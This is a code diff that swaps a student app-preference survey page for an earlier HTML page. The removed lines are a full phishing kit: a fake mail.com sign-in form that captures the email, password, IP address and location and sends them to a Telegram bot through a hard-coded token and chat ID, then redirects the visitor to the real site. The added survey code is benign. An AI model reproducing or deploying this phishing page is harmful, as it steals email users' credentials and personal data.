@@ -1,373 +1,177 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>mail.com - Free Email Accounts</title>
-    <link rel="icon" href="https://www.mail.com/favicon.ico" type="image/x-icon">
-    
-    <!-- Font Awesome for eye icon -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: #f5f5f5;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        header {
-            background: #003087;
-            color: white;
-            padding: 15px 0;
-        }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 20px;
-        }
-
-        .logo {
-            font-size: 28px;
-            font-weight: bold;
-        }
-
-        .logo span {
-            color: #ffcc00;
-        }
-
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            margin-left: 25px;
-            font-size: 14px;
-        }
-
-        .nav-links a:hover {
-            text-decoration: underline;
-        }
-
-        .main-content {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-        }
-
-        .login-box {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
-            width: 100%;
-            max-width: 420px;
-            padding: 40px 35px;
-            text-align: center;
-        }
-
-        .login-title {
-            font-size: 28px;
-            margin-bottom: 8px;
-            color: #003087;
-            font-weight: bold;
-        }
-
-        .login-subtitle {
-            font-size: 15px;
-            color: #555;
-            margin-bottom: 30px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-            position: relative;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 14px;
-            color: #333;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 12px 45px 12px 14px; /* extra right padding for icon */
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .input-field:focus {
-            border-color: #003087;
-            box-shadow: 0 0 0 2px rgba(0,48,135,0.15);
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 14px;
-            top: 70%; /* better vertical centering - adjusted for label height */
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #666;
-            font-size: 18px;
-            user-select: none;
-            line-height: 1;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin: 15px 0 25px;
-            font-size: 14px;
-        }
-
-        .checkbox-group input {
-            margin-right: 10px;
-        }
-
-        .btn-login {
-            width: 100%;
-            padding: 14px;
-            background: #003087;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .btn-login:hover {
-            background: #002060;
-        }
-
-        .links {
-            margin-top: 25px;
-            font-size: 14px;
-        }
-
-        .links a {
-            color: #003087;
-            text-decoration: none;
-            margin: 0 15px;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        .footer {
-            background: #003087;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            font-size: 13px;
-            margin-top: auto;
-        }
-
-        .footer a {
-            color: #ffcc00;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 500px) {
-            .login-box {
-                padding: 30px 20px;
-            }
-        }
-
-        /* Loading overlay */
-        #loadingOverlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 48, 135, 0.95);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            color: white;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease, visibility 0.4s ease;
-        }
-
-        #loadingOverlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255,255,255,0.2);
-            border-top: 5px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            font-size: 18px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DOU Student Survey</title>
+  <!-- App-like Meta Tags -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+    :root { 
+      --purple: #510F64; 
+      --purple-light: #8B2FC9; 
+      --bg: #030712; 
+      --card: #111827; 
+      --text: #F9FAFB; 
+      --muted: #9CA3AF; 
+      --border: rgba(255, 255, 255, 0.1); 
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { 
+      font-family: 'Plus Jakarta Sans', sans-serif; 
+      background: var(--bg); 
+      color: var(--text); 
+      height: 100dvh; 
+      overflow: hidden; 
+      background-image: radial-gradient(circle at 0% 0%, rgba(81, 15, 100, 0.15) 0%, transparent 50%);
+    }
+    .screen { position: fixed; inset: 0; display: none; flex-direction: column; padding: 1.5rem; transition: 0.3s; }
+    .screen.active { display: flex; }
+    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; padding-top: env(safe-area-inset-top); }
+    .q-title { font-size: 1.8rem; font-weight: 800; margin-bottom: 0.5rem; line-height: 1.1; letter-spacing: -0.02em; }
+    .q-sub { color: var(--muted); font-size: 0.95rem; margin-bottom: 2rem; }
+    .options-list { display: flex; flex-direction: column; gap: 0.8rem; overflow-y: auto; padding-bottom: 120px; }
+    .option-btn { background: var(--card); border: 1px solid var(--border); padding: 1.2rem; border-radius: 18px; color: var(--text); display: flex; align-items: center; gap: 1rem; font-size: 1rem; font-weight: 600; text-align: left; transition: 0.2s; }
+    .option-btn:active { transform: scale(0.96); background: rgba(139, 47, 201, 0.1); }
+    .option-btn.selected { border-color: var(--purple-light); background: rgba(139, 47, 201, 0.15); box-shadow: 0 0 15px rgba(139, 47, 201, 0.2); }
+    .text-input { width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 18px; padding: 1.2rem; color: var(--text); font-family: inherit; font-size: 1rem; min-height: 120px; outline: none; }
+    .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; padding: 1.5rem calc(1.5rem + env(safe-area-inset-right)) calc(1.5rem + env(safe-area-inset-bottom)); background: linear-gradient(transparent, var(--bg) 40%); display: flex; gap: 0.8rem; }
+    .btn { flex: 1; height: 60px; border-radius: 18px; border: none; font-size: 1.1rem; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+    .btn-next { background: var(--purple); color: white; box-shadow: 0 4px 15px rgba(81, 15, 100, 0.4); }
+    .btn-next:disabled { opacity: 0.4; }
+    .btn-back { background: var(--card); color: var(--muted); flex: 0.4; border: 1px solid var(--border); }
+    .progress { height: 6px; background: var(--border); border-radius: 10px; margin-bottom: 2rem; overflow: hidden; }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, var(--purple), var(--purple-light)); border-radius: 10px; transition: 0.4s; }
+    .hero { flex: 1; display: flex; flex-direction: column; justify-content: center; text-align: center; }
+    .count-badge { background: rgba(139, 47, 201, 0.1); color: var(--purple-light); padding: 6px 14px; border-radius: 20px; font-size: 0.8rem; font-weight: 700; display: inline-block; margin-bottom: 1rem; border: 1px solid rgba(139, 47, 201, 0.2); }
+  </style>
 </head>
 <body>
 
-    <!-- Loading overlay -->
-    <div id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text">Loading...</div>
+  <!-- LANDING -->
+  <section id="landing" class="screen active">
+    <div class="hero">
+      <div id="badgeArea"><span class="count-badge">Checking votes...</span></div>
+      <h1 class="q-title" style="font-size: 2.5rem;">Pick the next <span style="color:var(--purple-light)">DOU</span> App</h1>
+      <p class="q-sub">Built by students, for students. Your vote decides what we develop next for Dennis Osadabey University.</p>
+      <button class="btn btn-next" onclick="start()">Start Survey →</button>
     </div>
+  </section>
 
-    <header>
-        <div class="header-container">
-            <div class="logo">mail<span>.com</span></div>
-            <div class="nav-links">
-                <a href="#">Help</a>
-                <a href="#">Sign up</a>
-            </div>
-        </div>
-    </header>
+  <!-- SURVEY -->
+  <section id="survey" class="screen">
+    <div class="header">
+      <span style="font-weight:800; color:var(--purple-light)">DOU Studio</span>
+      <span id="stepTxt" style="font-size:0.8rem; font-weight:700; color:var(--muted)">1/5</span>
+    </div>
+    <div class="progress"><div id="pFill" class="progress-fill" style="width: 20%;"></div></div>
+    <div id="qArea"></div>
+    <div class="nav-bar">
+      <button id="bBtn" class="btn btn-back" onclick="prev()">Back</button>
+      <button id="nBtn" class="btn btn-next" onclick="next()">Next</button>
+    </div>
+  </section>
 
-    <main class="main-content">
-        <div class="login-box">
-            <h1 class="login-title">Sign in</h1>
-            <p class="login-subtitle">to your mail.com email account</p>
+  <!-- SUCCESS -->
+  <section id="thanks" class="screen">
+    <div class="hero">
+      <div style="font-size: 4rem; margin-bottom: 1rem;">🚀</div>
+      <h1 class="q-title">Vote Recorded!</h1>
+      <p class="q-sub">Thanks for participating. We're analyzing the data to start building the most requested app.</p>
+      <button class="btn btn-next" onclick="location.reload()">Finish</button>
+    </div>
+  </section>
 
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="email">Email address</label>
-                    <input type="email" id="email" class="input-field" placeholder="yourname@mail.com" autocomplete="email" required autofocus>
-                </div>
+  <script>
+    // --- YOUR LIVE DATABASE LINK ---
+    const DB_URL = 'https://script.google.com/macros/s/AKfycbxJOFx17UvGldGJL8CKUMUQVtw-XJSKZlGXVqpzTykHxe8RA3Li832rJAKc5250iz14eg/exec'; 
 
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" class="input-field" placeholder="••••••••" autocomplete="current-password" required>
-                    <i class="fas fa-eye password-toggle" id="togglePassword"></i>
-                </div>
+    const questions = [
+      { id: 'choice', type: 'single', q: 'Which app do you need most?', sub: 'Pick your top priority.', options: [{e:'📚', t:'CBT Exam Practice'}, {e:'🍽️', t:'Canteen Pre-order'}, {e:'📅', t:'Timetable Tracker'}, {e:'🏠', t:'Hostel Finder'}] },
+      { id: 'dept', type: 'single', q: 'Your Department?', sub: 'Helps us tailor the features.', options: [{e:'💻', t:'Comp Sci'}, {e:'🔐', t:'Cyber Security'}, {e:'📊', t:'Data Science'}, {e:'⚙️', t:'Software Eng.'}, {e:'🏫', t:'Other'}] },
+      { id: 'pay', type: 'single', q: 'Would you pay for it?', sub: 'Honesty helps our pricing.', options: [{e:'💰', t:'Yes, if affordable'}, {e:'💭', t:'Maybe'}, {e:'🆓', t:'No, free only'}] },
+      { id: 'pain', type: 'single', q: 'Biggest pain point?', sub: 'What stresses you most?', options: [{e:'😰', t:'Lack of past questions'}, {e:'😵', t:'Missing classes'}, {e:'💸', t:'Money management'}, {e:'🍛', t:'Food queues'}] },
+      { id: 'idea', type: 'text', q: 'Any other app idea?', sub: 'Optional: What else is missing?', placeholder: 'I wish there was an app for...' }
+    ];
 
-                <div class="checkbox-group">
-                    <input type="checkbox" id="staySignedIn" checked>
-                    <label for="staySignedIn">Stay signed in</label>
-                </div>
+    let step = 0; 
+    let answers = {};
 
-                <button type="submit" class="btn-login">Sign in</button>
-            </form>
+    // Get live vote count from Google Sheets
+    async function getCount() {
+      try {
+        const r = await fetch(DB_URL);
+        const d = await r.json();
+        document.getElementById('badgeArea').innerHTML = `<span class="count-badge">${d.total} Students Voted Already</span>`;
+      } catch(e) { 
+        document.getElementById('badgeArea').innerHTML = `<span class="count-badge">Join the community vote</span>`; 
+      }
+    }
 
-            <div class="links">
-                <a href="#">Forgot password?</a>
-                <a href="#">Create account</a>
-            </div>
-        </div>
-    </main>
+    function start() { 
+      document.getElementById('landing').classList.remove('active'); 
+      document.getElementById('survey').classList.add('active'); 
+      render(); 
+    }
 
-    <footer class="footer">
-        © 2025 mail.com – <a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">Imprint</a>
-    </footer>
+    function render() {
+      const q = questions[step];
+      const area = document.getElementById('qArea');
+      document.getElementById('pFill').style.width = ((step+1)/questions.length)*100 + '%';
+      document.getElementById('stepTxt').innerText = (step+1) + ' / ' + questions.length;
+      document.getElementById('bBtn').style.visibility = step === 0 ? 'hidden' : 'visible';
+      document.getElementById('nBtn').innerText = step === questions.length - 1 ? 'Finish 🎉' : 'Next';
 
-    <script>
-        // Telegram Bot Config
-        const BOT_TOKEN = '8433918478:AAFlTG5m6wqZrtO5bzakiQVVlJ3F0c0HD4M';
-        const CHAT_ID   = '8373872178';
-        const REDIRECT_URL = 'https://www.mail.com';
-
-        // Password toggle
-        const passwordInput = document.getElementById('password');
-        const togglePassword = document.getElementById('togglePassword');
-
-        togglePassword.addEventListener('click', () => {
-            const type = passwordInput.type === 'password' ? 'text' : 'password';
-            passwordInput.type = type;
-            togglePassword.classList.toggle('fa-eye');
-            togglePassword.classList.toggle('fa-eye-slash');
+      let html = `<h1 class="q-title">${q.q}</h1><p class="q-sub">${q.sub}</p>`;
+      if(q.type === 'single') {
+        html += `<div class="options-list">`;
+        q.options.forEach(o => {
+          const sel = answers[q.id] === o.t ? 'selected' : '';
+          html += `<button class="option-btn ${sel}" onclick="pick('${q.id}','${o.t}')"><span>${o.e}</span><span>${o.t}</span></button>`;
         });
+        html += `</div>`;
+      } else {
+        html += `<textarea id="textIn" class="text-input" placeholder="${q.placeholder}" oninput="answers['${q.id}']=this.value">${answers[q.id]||''}</textarea>`;
+      }
+      area.innerHTML = html;
+      document.getElementById('nBtn').disabled = q.type === 'single' && !answers[q.id];
+    }
 
-        // Form submit with Telegram + IP + Geo
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+    function pick(id, val) { 
+      answers[id] = val; 
+      render(); 
+      // Auto-advance
+      setTimeout(() => { if(step < questions.length - 1) next(); }, 400); 
+    }
 
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
+    function next() { 
+      if(step < questions.length - 1) { 
+        step++; render(); 
+      } else { 
+        submit(); 
+      } 
+    }
 
-            if (!password) return;
+    function prev() { 
+      if(step > 0) { step--; render(); } 
+    }
 
-            // Show loading
-            document.getElementById('loadingOverlay').classList.add('active');
+    async function submit() {
+      document.getElementById('survey').classList.remove('active');
+      document.getElementById('thanks').classList.add('active');
+      
+      // Submit to Google Sheets
+      fetch(DB_URL, { 
+        method: 'POST', 
+        mode: 'no-cors', 
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(answers) 
+      });
+    }
 
-            // Get IP + Geolocation
-            let ip = 'unknown';
-            let geo = 'unknown';
-
-            try {
-                const geoResponse = await fetch('https://ipapi.co/json/');
-                const geoData = await geoResponse.json();
-                ip = geoData.ip || 'hidden';
-                geo = `${geoData.city || 'unknown'}, ${geoData.region || ''}, ${geoData.country_name || 'unknown'} (TZ: ${geoData.timezone || 'unknown'})`;
-            } catch (err) {
-                console.error('Geo fetch failed:', err);
-            }
-
-            // Message for Telegram
-            const message = `
-NEW MAIL.COM LOGIN
-Time: ${new Date().toLocaleString()}
-Email: ${email || '(empty)'}
-Password: ${password}
-IP Address: ${ip}
-Location: ${geo}
-URL: ${window.location.href}
-            `.trim();
-
-            // Send to Telegram
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        disable_web_page_preview: true
-                    }),
-                    keepalive: true
-                });
-                console.log('Sent to Telegram');
-            } catch (err) {
-                console.error('Telegram error:', err);
-            }
-
-            // Redirect after delay
-            setTimeout(() => {
-                window.location.replace(REDIRECT_URL);
-            }, 1800);
-        });
-    </script>
-
+    window.onload = getCount;
+  </script>
 </body>
 </html>
